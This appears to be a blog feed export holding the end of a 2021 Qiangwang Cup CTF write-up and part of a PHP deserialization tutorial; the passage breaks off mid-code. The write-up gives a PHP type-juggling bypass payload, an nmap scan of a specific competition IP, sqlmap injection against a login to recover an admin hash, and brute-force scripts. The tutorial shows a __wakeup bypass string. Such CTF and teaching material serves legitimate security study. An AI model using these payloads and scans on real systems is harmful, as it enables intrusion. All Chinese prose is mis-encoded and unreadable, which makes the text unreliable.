class="line">pool = ThreadPool()    <span class="comment"># å¤šçº¿ç¨‹ä»»åŠ¡</span></span><br><span class="line">pool.<span class="built_in">map</span>(findmd5, <span class="built_in">list</span>) <span class="comment"># å‡½æ•° ä¸å‚æ•°åˆ—è¡¨</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure></li><li><p>å­—æ¯æˆ–æµ®ç‚¹æ•°ç»•è¿‡</p></li><li><p>è®©jsonè§£æä¸ºå‡å³å¯</p></li></ol><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ppp[number1]&#x3D;1025a&amp;ppp[number2]&#x3D;1e9&amp;ppp[number3]&#x3D;61823470&amp;ppp[number4]&#x3D;abcdefg&amp;ppp[number5]&#x3D;&#123;&#39;key&#39;:0&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210617224538860.png" alt="image-20210617224538860"></p><p><strong>key2</strong></p><p>ä¸€å¼€å§‹ç¡®å®æ²¡æƒ³åˆ°key2ç›´æ¥åœ¨ä¸€å¤§å †docæ–‡ä»¶ä¸­ï¼Œé‡Œé¢è¿˜æœ‰å‡ å¼ å›¾ç‰‡è¿·æƒ‘ï¼Œæˆ‘æ˜¯fw</p><p>æ—©å†™ä¸ªè„šæœ¬æ‰¾å¤šå¥½(å‚è€ƒwp)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> docx</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dir_file</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    file_list = []</span><br><span class="line">    <span class="keyword">for</span> top, dirs, non_dirs <span class="keyword">in</span> os.walk(file_path):</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> non_dirs:</span><br><span class="line">            file_list.append(os.path.join(top, item))</span><br><span class="line">    <span class="keyword">return</span> file_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docx_list = <span class="built_in">filter</span>(<span class="keyword">lambda</span> s: s.endswith(<span class="string">&#x27;.docx&#x27;</span>), dir_file(<span class="string">&#x27;five_month&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> docx_file <span class="keyword">in</span> docx_list:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        docx_object = docx.Document(docx_file)</span><br><span class="line">    <span class="keyword">except</span> docx.opc.exceptions.PackageNotFoundError:</span><br><span class="line">        print(<span class="string">&#x27;open failed: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(docx_file))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> para <span class="keyword">in</span> docx_object.paragraphs:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;KEY2&quot;</span> <span class="keyword">in</span> para.text:</span><br><span class="line">            print(docx_file)</span><br><span class="line">            print(para.text)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210617235601924.png" alt="image-20210617235601924"></p><p>æäº¤ä¸¤ä¸ªkeyå³å¯è·å¾— flag</p><h1 id="0x04-EasyWeb"><a href="#0x04-EasyWeb" class="headerlink" title="0x04 EasyWeb"></a>0x04 EasyWeb</h1><p>ç›®å½•çˆ†ç ´å¾—åˆ° /hint</p><p>è®¿é—®åå¾—åˆ°æç¤ºï¼ŒTry to scan 35000-40000 ^ __ ^</p><p>ä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 47.104.136.46 -p35000-40000</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/1623502207351-bf340032-e7d3-4bd5-9815-84869a122daa.png" alt="image.png"></p><p>è®¿é—®åä½¿ç”¨SQLMapåœ¨ç™»å½•å¤„ä¸€æŠŠæ¢­ï¼Œæ‹¿åˆ°å¸å·å¯†ç </p><p>admin/99f609527226e076d668668582ac4420</p><p>è¿›å…¥åå°ï¼Œæ‰¾åˆ°ä¸€å¤„æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä½†æ¯”èµ›ä¸­æ²¡èƒ½åˆ©ç”¨æˆåŠŸï¼Œæ­¢äºæ­¤ï¼ˆä¸Šä¼ å§¿åŠ¿è¿˜å¾—å¤šçœ‹çœ‹ï¼‰ã€‚</p><h1 id="0x05-wp"><a href="#0x05-wp" class="headerlink" title="0x05 wp"></a>0x05 wp</h1><p>[1] <a href="https://tari.moe/2021/06/14/2021qwb/index.html?_sw-precache=fb28550fbbe7e700e9ae4688ad1e8925">2021å¼ºç½‘æ¯ Web Writeup</a></p><p>[2] <a href="https://mp.weixin.qq.com/s/t6e64RrO3pwqAl-8a50-oA">å¼ºç½‘æ¯-WriteUp by ChaMd5</a></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜å†ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> qwb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ååºåˆ—åŒ–æ¼æ´å­¦ä¹ </title>
      <link href="posts/46951.html"/>
      <url>posts/46951.html</url>
      
        <content type="html"><![CDATA[<h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531173450710.png" alt="image-20210531173450710"></p><ul><li>åºåˆ—åŒ–ï¼ˆserializeï¼‰ï¼šå°†å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²</li><li>ååºåˆ—åŒ–ï¼ˆunserializeï¼‰ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯¹è±¡</li></ul><p><strong>æ³¨æ„ï¼š</strong></p><p>phpåºåˆ—åŒ–æ˜¯ä¸ºäº†åœ¨ç¨‹åºè¿è¡Œçš„è¿‡ç¨‹ä¸­æ–¹ä¾¿å¯¹è±¡è½¬å‚¨è€Œäº§ç”Ÿçš„ã€‚åºåˆ—åŒ–å¯ä»¥å°†å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œä½†ä»…ä¿ç•™å¯¹è±¡é‡Œçš„æˆå‘˜å˜é‡ï¼Œä¸ä¿ç•™å‡½æ•°æ–¹æ³•ã€‚</p><p><strong>ç®€å•ä¾‹å­</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Students</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$student1</span>=<span class="keyword">new</span> Students(<span class="string">&quot;zhansan&quot;</span>,<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span>=serialize(<span class="variable">$student1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;åºåˆ—åŒ–ï¼š\n&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>=unserialize(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ååºåˆ—åŒ–ï¼š\n&quot;</span>;</span><br><span class="line">print_r(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531181114482.png" alt="image-20210531181114482"></p><p>PHPåºåˆ—åŒ–å­—ç¬¦ä¸²é‡Šä¹‰ï¼ˆæ³¨æ„ï¼šæ­¤æ—¶ç±»çš„å±æ€§ä¸ºpublicï¼‰ï¼š</p><ul><li>O:Object</li><li>8ï¼šå¯¹è±¡æ‰€å±ç±»åé•¿åº¦</li><li>Studentsï¼šå¯¹è±¡æ‰€å±ç±»å</li><li>2ï¼šç±»ä¸­çš„ä¸¤ä¸ªå±æ€§</li><li>s:string</li><li>4ï¼šå±æ€§åé•¿åº¦</li><li>name:å±æ€§å</li><li>i:int</li></ul><p><strong>æ¼æ´äº§ç”ŸåŸå› ï¼š</strong></p><p>åœ¨PHPä»£ç ä¸­ä½¿ç”¨<code>unserialize</code>å‡½æ•°ååºåˆ—åŒ–æŸä¸€ä¸ªå¯¹è±¡ï¼Œè¯¥å¯¹è±¡è¢«è°ƒç”¨æ—¶è‡ªåŠ¨æ‰§è¡Œè‡ªå®šä¹‰çš„é­”æ³•æ–¹æ³•ï¼Œå¦‚æœè¿™äº›é­”æ³•æ–¹æ³•ä¸­æœ‰å±é™©çš„æ“ä½œæˆ–è€…åœ¨é­”æ³•æ–¹æ³•ä¸­å»è°ƒç”¨ç±»ä¸­å…¶ä»–å¸¦æœ‰å±é™©æ“ä½œçš„å‡½æ•°ä¸”å¦‚æœå±é™©æ“ä½œæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œé‚£ä¹ˆå°±å¯èƒ½ä¼šè§¦å‘phpååºåˆ—åŒ–æ¼æ´ã€‚</p><h1 id="PHPé­”æ³•å‡½æ•°"><a href="#PHPé­”æ³•å‡½æ•°" class="headerlink" title="PHPé­”æ³•å‡½æ•°"></a>PHPé­”æ³•å‡½æ•°</h1><h2 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h2><p>å½“å¯¹è±¡è¢«åˆ›å»ºæ—¶ä¼šè‡ªåŠ¨è°ƒç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;used construct!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>);</span><br><span class="line"><span class="comment">// è¾“å‡º used construct!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="destruct"><a href="#destruct" class="headerlink" title="__destruct"></a>__destruct</h2><p>å½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œååºåˆ—åŒ–å¸¸è§èµ·ç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;used destruct!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>);</span><br><span class="line"><span class="comment">// è¾“å‡º used destruct!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h2><p>å½“æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;used sleep!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span>=serialize(<span class="variable">$person1</span>);</span><br><span class="line"><span class="comment">// è¾“å‡º used sleep!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h2><p>å½“æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;used wakeup!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span>=serialize(<span class="variable">$person1</span>);</span><br><span class="line"><span class="variable">$obj</span>=unserialize(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">// è¾“å‡º used wakeup!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PSï¼š <code>__wakeup()</code>æ–¹æ³•ç»•è¿‡</p><p>å½“ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡<code>__wakeup</code> å‡½æ•°çš„æ‰§è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;zhangsan&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure><p> å…¶ä¸­Personåé¢çš„2ï¼Œä»£è¡¨ç±»ä¸­æœ‰2ä¸ªå±æ€§ï¼Œä½†å¦‚æœæˆ‘ä»¬æŠŠ2æ”¹æˆ3ï¼Œå°±ä¼šç»•è¿‡<code>__wakeup()</code> å‡½æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;zhangsan&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h2><p>å½“ååºåˆ—åŒ–åçš„å¯¹è±¡è¢«è½¬æ¢æˆå­—ç¬¦ä¸²å¤„ç†æ—¶è‡ªåŠ¨è°ƒç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;used toString!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span>=serialize(<span class="variable">$person1</span>);</span><br><span class="line"><span class="variable">$obj</span>=unserialize(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="comment">// è¾“å‡º used toString!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PSï¼š <code>__toString</code>é­”æ³•æ–¹æ³•è§¦å‘æ¡ä»¶æ¯”è¾ƒå¤šâˆ¶</p><ul><li>echo($obj) æ‰“å°æ—¶è§¦å‘</li><li>ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶</li><li>ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶</li><li>ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œ == æ¯”è¾ƒæ—¶ï¼ˆPHPè¿›è¡Œ==æ¯”è¾ƒæ—¶ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼‰</li><li>ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–sqlè¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶</li><li>ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡phpå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚strlen()ã€addslashes()æ—¶</li><li>åœ¨in array()æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰toStringè¿”å›<br>çš„å­—ç¬¦ä¸²æ—¶toStringä¼šè¢«è°ƒç”¨</li><li>ååºåˆ—åŒ–å¯¹è±¡ä½œä¸ºclass_exists()çš„å‚æ•°æ—¶</li></ul><h2 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h2><p>å½“ä»ä¸å¯è®¿é—®çš„å±æ€§ï¼ˆprivateæˆ–æ²¡æœ‰çš„å±æ€§ï¼‰ä¸­è¯»å–æ•°æ®æ—¶è‡ªåŠ¨è°ƒç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$sex</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex=<span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;used get!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$person1</span>-&gt;sex</span><br><span class="line"><span class="comment">// è¾“å‡º used get!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h2><p>å½“ç»™ä¸å¯è®¿é—®çš„å±æ€§èµ‹å€¼æ—¶è‡ªåŠ¨è°ƒç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$sex</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex=<span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$naem</span>,<span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;used set!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span 